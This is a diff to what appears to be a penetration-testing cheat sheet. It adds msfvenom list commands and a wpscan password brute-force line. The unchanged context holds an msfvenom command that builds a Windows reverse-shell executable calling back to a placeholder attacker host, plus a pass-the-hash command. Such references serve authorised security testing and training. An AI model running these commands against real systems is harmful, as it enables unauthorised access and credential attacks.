@@ -2093,6 +2093,12 @@ cp ruby_exploit /opt/metasploit-framework/embedded/framework/modules/exploits/pa
 # list available payloads
 msfvenom --list payloads
 
+# list available encoders
+msfvenom --list encoder
+
+# list available formats
+msfvenom --list format
+
 # create Windows TCP reverse shell exe - 64-bit (unstaged)
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=attacker_IP LPORT=port_here -f exe -a x64 -o shell.exe
 
@@ -4146,6 +4152,9 @@ pth-winexe -U domain_here/user_here cmd.exe
 ```bash
 # scan wordpress
 wpscan --url url_here --enumerate ap,at,cb,dbe
+
+# brute force passwords
+wpscan --url url_here -P /path/to/wordlist
 ```
 
 
